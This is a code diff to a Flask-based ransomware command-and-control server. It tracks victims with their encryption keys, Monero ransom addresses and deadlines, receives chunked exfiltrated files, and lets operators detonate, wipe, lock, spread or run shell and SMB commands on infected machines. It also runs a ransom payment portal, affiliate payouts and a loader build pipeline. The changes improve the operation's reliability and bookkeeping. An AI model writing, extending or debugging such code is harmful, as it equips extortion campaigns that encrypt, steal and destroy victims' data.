@@ -31,6 +31,7 @@ import os
 import re
 import secrets
 import shutil
+import sqlite3
 import sys
 import threading
 import time
@@ -455,8 +456,9 @@ def _deadman_tick() -> None:
 
 
 def _housekeeping_tick() -> None:
-    _schedule_tick()
-    _deadman_tick()
+    with _HOUSEKEEPING_LOCK:
+        _schedule_tick()
+        _deadman_tick()
 
 
 def _housekeeping_loop() -> None:
@@ -658,6 +660,7 @@ _CHECKIN_LOCK = threading.Lock()
 _SIG_SEEN = {}
 _SIG_LOCK = threading.Lock()
 _PROOF_LOCK = threading.Lock()
+_HOUSEKEEPING_LOCK = threading.Lock()
 
 
 def _configured_api_token() -> str:
@@ -760,9 +763,11 @@ def api_token_guard():
     if not token:
         return None
     sent = request.headers.get("X-Vex-Token", "")
-    if not secrets.compare_digest(sent, token):
-        abort(403)
-    return None
+    if secrets.compare_digest(sent, token):
+        return None
+    if c2db.campaign_by_token(sent):
+        return None
+    abort(403)
 
 
 @app.before_request
@@ -1010,6 +1015,8 @@ def api_checkin():
     host = (request.form.get("host") or "").strip()
     user = (request.form.get("user") or "").strip()[:128]
     os_info = (request.form.get("os") or "Unknown").strip()[:128]
+    campaign_id = c2db.campaign_by_token(
+        (request.headers.get("X-Vex-Token") or "").strip())
     ip = _client_ip()
     aes = crypto_util.unwrap_key(cipher_rsa, wrapped)
     wrapped_store = vault.seal(wrapped)
@@ -1059,8 +1066,8 @@ def api_checkin():
             xmr = chosen if chosen else pool[start]
         conn.execute("""INSERT INTO victims
             (vid, wrapped_key, aes_key, hostname, username, ip, os_info,
-             timestamp, last_ping, price, xmr_address, deadline)
-            VALUES (?,?,?,?,?,?,?,?,?,?,?,?)
+             timestamp, last_ping, price, xmr_address, deadline, campaign_id)
+            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)
             ON CONFLICT(vid) DO UPDATE SET
               wrapped_key=CASE WHEN COALESCE(victims.wrapped_key,'')=''
                                THEN excluded.wrapped_key ELSE victims.wrapped_key END,
@@ -1074,9 +1081,11 @@ def api_checkin():
               price=CASE WHEN COALESCE(victims.price,0)=0 THEN excluded.price
                          ELSE victims.price END,
               xmr_address=CASE WHEN COALESCE(victims.xmr_address,'')=''
-                               THEN excluded.xmr_address ELSE victims.xmr_address END""",
+                               THEN excluded.xmr_address ELSE victims.xmr_address END,
+              campaign_id=CASE WHEN COALESCE(victims.campaign_id,0)=0
+                               THEN excluded.campaign_id ELSE victims.campaign_id END""",
             (vid, wrapped_store, aes_store, host, user, ip, os_info, now, now,
-             price, xmr, deadline))
+             price, xmr, deadline, campaign_id))
         conn.commit()
 
     if not existing:
@@ -1124,12 +1133,12 @@ def api_ping():
         return Response("kill", mimetype="text/plain")
     vid = (request.args.get("vid") or "").strip()
     try:
-        _schedule_tick()
-        _deadman_tick()
+        _housekeeping_tick()
     except Exception:
         pass
     with c2db.db() as conn:
-        row = conn.execute("SELECT detonate, pardon FROM victims WHERE vid=?", (vid,)).fetchone()
+        row = conn.execute("SELECT detonate, pardon, status FROM victims WHERE vid=?",
+                           (vid,)).fetchone()
         if row is None:
             return "unknown", 404
         conn.execute("UPDATE victims SET last_ping=? WHERE vid=?", (c2db.now(), vid))
@@ -1137,10 +1146,13 @@ def api_ping():
 
     armed = int(row["detonate"] or 0)
     pardoned = int(row["pardon"] or 0)
-    # Pardon wins over arm/kill: the machine is being released, so it must not
-    # detonate if a stale arm flag is still set.
+    victim_status = (row["status"] or "").lower()
+    # A settled or released victim must never detonate because of a stale arm
+    # flag. Pardon wins over everything; paid/pardoned sleep.
     status = ("pardon" if pardoned else
-              ("kill" if armed == 2 else ("detonate" if armed == 1 else "sleep")))
+              "sleep" if victim_status in ("paid", "pardoned") else
+              "kill" if armed == 2 else
+              "detonate" if armed == 1 else "sleep")
 
     lines = [status]
     host = c2db.get_setting("c2_host", "").strip()
@@ -1205,10 +1217,13 @@ def api_exfil():
     xfer = (request.form.get("xfer") or "").strip()
     if xfer and not re.fullmatch(r"[A-Za-z0-9]{6,32}", xfer):
         return "bad transfer id", 400
+    if total > 1 and not xfer:
+        return "transfer id required for multi-chunk uploads", 400
 
     safe = re.sub(r"[^A-Za-z0-9._-]", "_", os.path.basename(name))[:120] or "file"
+    name_tag = hashlib.sha256(safe.encode()).hexdigest()[:12]
     os.makedirs(UPLOAD_DIR, exist_ok=True)
-    tag = f"{_safe_component(vid)}_{xfer}" if xfer else _safe_component(vid)
+    tag = f"{_safe_component(vid)}_{xfer or name_tag}"
     part = os.path.join(UPLOAD_DIR, f".part_{tag}_{idx}")
     if idx == 0:
         for old in glob.glob(os.path.join(UPLOAD_DIR, f".part_{tag}_*")):
@@ -1221,18 +1236,20 @@ def api_exfil():
         f.write(raw)
 
     if idx == total - 1:
+        parts = [os.path.join(UPLOAD_DIR, f".part_{tag}_{i}")
+                 for i in range(total)]
+        if not all(os.path.exists(p) for p in parts):
+            return "incomplete upload", 400
         final = os.path.join(UPLOAD_DIR,
-                             f"{_safe_component(vid)}_{xfer or secrets.token_hex(3)}_{safe}")
+                             f"{_safe_component(vid)}_{xfer or name_tag}_{safe}")
         with open(final, "wb") as out:
-            for i in range(total):
-                p = os.path.join(UPLOAD_DIR, f".part_{tag}_{i}")
-                if os.path.exists(p):
-                    with open(p, "rb") as f:
-                        out.write(f.read())
-                    try:
-                        os.unlink(p)
-                    except OSError:
-                        pass
+            for p in parts:
+                with open(p, "rb") as f:
+                    out.write(f.read())
+                try:
+                    os.unlink(p)
+                except OSError:
+                    pass
         size = os.path.getsize(final)
         c2db.add_upload(vid, safe, final, size)
         c2db.log_event("payload", "exfil", vid, f"{safe} {size}B")
@@ -1598,7 +1615,10 @@ def chat_file(name):
 @app.route("/admin/detonate/<vid>", methods=["POST"])
 @login_required("admin")
 def detonate(vid):
-    victim_or_404(vid)
+    v = victim_or_404(vid)
+    if int(v["pardon"] or 0) or (v["status"] or "") in ("paid", "pardoned", "dead"):
+        flash("paid, pardoned, and dead victims cannot be re-armed", "error")
+        return redirect(url_for("victim", vid=vid))
     with c2db.db() as conn:
         conn.execute("UPDATE victims SET detonate=1, pardon=0, status='encrypted' WHERE vid=?", (vid,))
         conn.commit()
@@ -1634,7 +1654,10 @@ def detonate_reset(vid):
 @app.route("/admin/kill/<vid>", methods=["POST"])
 @login_required("admin")
 def kill(vid):
-    victim_or_404(vid)
+    v = victim_or_404(vid)
+    if int(v["pardon"] or 0) or (v["status"] or "") in ("paid", "pardoned"):
+        flash("paid or pardoned victims cannot be killed", "error")
+        return redirect(url_for("victim", vid=vid))
     with c2db.db() as conn:
         conn.execute("UPDATE victims SET detonate=2, pardon=0, status='dead' WHERE vid=?", (vid,))
         conn.commit()
@@ -1689,12 +1712,9 @@ def pardon_all():
 @app.route("/admin/mark_paid/<vid>", methods=["POST"])
 @login_required("admin")
 def mark_paid(vid):
-    victim_or_404(vid)
-    with c2db.db() as conn:
-        conn.execute("UPDATE victims SET status='paid', paid_at=? WHERE vid=?",
-                     (c2db.now(), vid))
-        conn.commit()
-    c2db.cancel_destructive_commands(vid)
+    if not c2db.mark_paid(vid, current_user() or ""):
+        flash("dead or pardoned victims cannot be marked paid", "error")
+        return redirect(url_for("victim", vid=vid))
     c2db.log_event(current_user(), "paid", vid, "manual")
     notify.send(f"victim marked paid: {vid[:12]}")
     return redirect(url_for("victim", vid=vid))
@@ -1713,21 +1733,26 @@ def bulk():
     with c2db.db() as conn:
         for vid in vids:
             if action == "detonate":
-                conn.execute("UPDATE victims SET detonate=1, pardon=0, status='encrypted' WHERE vid=?", (vid,))
+                conn.execute("""UPDATE victims SET detonate=1, pardon=0,
+                                status='encrypted' WHERE vid=?
+                                AND status NOT IN ('paid','pardoned','dead')
+                                AND COALESCE(pardon,0)=0""", (vid,))
             elif action == "pardon":
                 conn.execute("""UPDATE victims SET pardon=1, detonate=0,
                                 status='pardoning' WHERE vid=?""", (vid,))
             elif action == "kill":
-                conn.execute("UPDATE victims SET detonate=2, pardon=0, status='dead' WHERE vid=?", (vid,))
+                conn.execute("""UPDATE victims SET detonate=2, pardon=0,
+                                status='dead' WHERE vid=?
+                                AND status NOT IN ('paid','pardoned')
+                                AND COALESCE(pardon,0)=0""", (vid,))
             elif action == "reset":
                 conn.execute("UPDATE victims SET detonate=0 WHERE vid=?", (vid,))
             elif action == "paid":
-                conn.execute("UPDATE victims SET status='paid', paid_at=? WHERE vid=?",
-                             (c2db.now(), vid))
                 conn.commit()
-                c2db.cancel_destructive_commands(vid)
+                c2db.mark_paid(vid, current_user() or "")
             elif action == "delete":
-                conn.execute("DELETE FROM victims WHERE vid=?", (vid,))
+                conn.commit()
+                c2db.purge_victim(vid)
         conn.commit()
     c2db.log_event(current_user(), f"bulk_{action}", "", f"{len(vids)} victims")
     return redirect(url_for("dashboard"))
@@ -1737,23 +1762,27 @@ def bulk():
 @login_required("admin")
 def delete_victim(vid):
     victim_or_404(vid)
-    with c2db.db() as conn:
-        conn.execute("DELETE FROM victims WHERE vid=?", (vid,))
-        conn.commit()
-    c2db.log_event(current_user(), "delete", vid, "")
+    res = c2db.purge_victim(vid)
+    c2db.log_event(current_user(), "delete", vid,
+                   f"files={res['files']} {res['ledger']}")
     return redirect(url_for("dashboard"))
 
 
 @app.route("/admin/command/<vid>", methods=["POST"])
 @login_required("admin")
 def queue_command(vid):
-    victim_or_404(vid)
+    v = victim_or_404(vid)
     ctype = (request.form.get("ctype") or "").strip()
     if ctype not in ("shell", "pull", "push", "lock", "uninstall", "reboot", "wipe",
                      "ls", "recon", "exfil", "screenshot",
                      "admins", "sessions", "shares", "domain", "users",
                      "spread", "netenum", "smbexec", "usb"):
         flash("unknown command type", "error")
+        return redirect(url_for("victim", vid=vid))
+    if ctype in ("lock", "wipe") and (
+            int(v["pardon"] or 0)
+            or (v["status"] or "") in ("paid", "pardoned", "dead")):
+        flash("paid, pardoned, and dead victims cannot receive lock/wipe", "error")
         return redirect(url_for("victim", vid=vid))
     arg = (request.form.get("arg") or "")[:8000]
     if ctype == "push":
@@ -1864,12 +1893,19 @@ def payments_page():
         if not vid or amount <= 0:
             flash("victim and a positive amount are required", "error")
             return redirect(url_for("payments_page"))
-        victim_or_404(vid)
-        total = c2db.add_payment(vid, amount,
-                                 (request.form.get("note") or "")[:500],
-                                 (request.form.get("txid") or "")[:200],
-                                 current_user() or "",
-                                 affiliate=current_user() or "")
+        v = victim_or_404(vid)
+        if (v["status"] or "") in ("dead", "pardoned"):
+            flash("dead or pardoned victims cannot receive payments", "error")
+            return redirect(url_for("payments_page"))
+        try:
+            total = c2db.add_payment(vid, amount,
+                                     (request.form.get("note") or "")[:500],
+                                     (request.form.get("txid") or "")[:200],
+                                     current_user() or "",
+                                     affiliate=current_user() or "")
+        except sqlite3.IntegrityError:
+            flash("that txid is already credited", "error")
+            return redirect(url_for("payments_page"))
         c2db.log_event(current_user(), "payment", vid, f"{amount:.2f} total={total:.2f}")
         flash(f"payment recorded; total credited ${total:,.2f}", "ok")
         return redirect(url_for("payments_page"))
@@ -2277,12 +2313,11 @@ def portal_proof():
     with _PROOF_LOCK:
         with c2db.db() as conn:
             already = conn.execute(
-                "SELECT 1 FROM events WHERE vid=? AND kind IN ('proof','proof_attempt') "
-                "LIMIT 1", (vid,)).fetchone()
+                "SELECT 1 FROM events WHERE vid=? AND kind='proof' LIMIT 1",
+                (vid,)).fetchone()
         if already:
             flash("a decryption proof was already used for this victim", "error")
             return redirect(url_for("portal_view"))
-        c2db.log_event("portal", "proof_attempt", vid, f.filename or "sample")
     data = f.read((max_mb * 1024 * 1024) + 1)
     if len(data) > max_mb * 1024 * 1024:
         flash(f"file too large (max {max_mb} MB)", "error")
@@ -2302,6 +2337,7 @@ def portal_proof():
         cap = min(crypto_util.MAX_CONTAINER, max(64 * 1024 * 1024, len(data) * 64))
         plain = crypto_util.decrypt_container(data, key, cap)
     except Exception:
+        c2db.log_event("portal", "proof_failed", vid, f.filename or "sample")
         flash("decryption failed: wrong key or corrupted sample", "error")
         return redirect(url_for("portal_view"))
 
@@ -2584,6 +2620,9 @@ def campaign_compile(cid):
     c = c2db.get_campaign(cid)
     if not c:
         abort(404)
+    if not int(c["active"] or 0):
+        flash("campaign is inactive or nuked; reactivate it explicitly first", "error")
+        return redirect(url_for("campaign_page", cid=cid))
     if not campaign_builder.available():
         flash("MSBuild or loader missing on this host", "error")
         return redirect(url_for("campaign_page", cid=cid))
@@ -2696,7 +2735,9 @@ def campaign_build(cid):
 def payout_status(pid, status):
     if status not in ("approved", "paid", "rejected"):
         abort(400)
-    c2db.set_payout_status(pid, status, current_user() or "")
+    if not c2db.set_payout_status(pid, status, current_user() or ""):
+        flash("invalid payout transition", "error")
+        return redirect(url_for("affiliates_page"))
     c2db.log_event(current_user(), "payout_" + status, "", str(pid))
     flash(f"payout {status}", "ok")
     return redirect(url_for("affiliates_page"))
@@ -2724,12 +2765,10 @@ def affiliate_request():
         amount = float(request.form.get("amount") or 0)
     except ValueError:
         amount = 0.0
-    summary = c2db.affiliate_summary(current_user())
-    if amount <= 0 or amount > max(0.0, summary["balance"]):
+    if amount <= 0 or not c2db.request_payout(
+            current_user(), amount, (request.form.get("note") or "")[:300]):
         flash("invalid payout request", "error")
     else:
-        c2db.request_payout(current_user(), amount,
-                            (request.form.get("note") or "")[:300])
         c2db.log_event(current_user(), "payout_request", "", f"${amount:.2f}")
         flash("payout requested", "ok")
     return redirect(url_for("affiliate_home"))
@@ -2926,8 +2965,16 @@ def refund(vid):
     if amount <= 0:
         flash("invalid refund amount", "error")
         return redirect(url_for("victim", vid=vid))
+    if amount > c2db.payments_total(vid) + 1e-9:
+        flash("refund exceeds recorded payments", "error")
+        return redirect(url_for("victim", vid=vid))
+    with c2db.db() as conn:
+        row = conn.execute(
+            "SELECT affiliate FROM payments WHERE vid=? AND affiliate!='' "
+            "ORDER BY id DESC LIMIT 1", (vid,)).fetchone()
+    affiliate = (row["affiliate"] or "") if row else ""
     c2db.add_payment(vid, -amount, (request.form.get("note") or "")[:200],
-                     "", current_user() or "", "")
+                     "", current_user() or "", affiliate)
     c2db.log_event(current_user(), "refund", vid, f"-{amount:.2f}")
     flash(f"refund recorded: ${amount:,.2f}", "ok")
     return redirect(url_for("victim", vid=vid))
@@ -3145,15 +3192,10 @@ def root_keys_zip():
 @root_stepup_required
 def root_release(vid):
     victim_or_404(vid)
-    with c2db.db() as conn:
-        conn.execute("UPDATE victims SET status='paid', "
-                     "paid_at=COALESCE(NULLIF(paid_at,''), ?) WHERE vid=?",
-                     (c2db.now(), vid))
-        conn.commit()
-    c2db.cancel_destructive_commands(vid)
+    c2db.release_victim(vid)
     c2db.log_event(current_user(), "root_override", vid, "release without payment")
     notify.send(f"ROOT release without payment: {vid[:12]}")
-    flash("victim released (marked paid)", "ok")
+    flash("victim released; invoice voided", "ok")
     return redirect(url_for("victim", vid=vid))
 
 
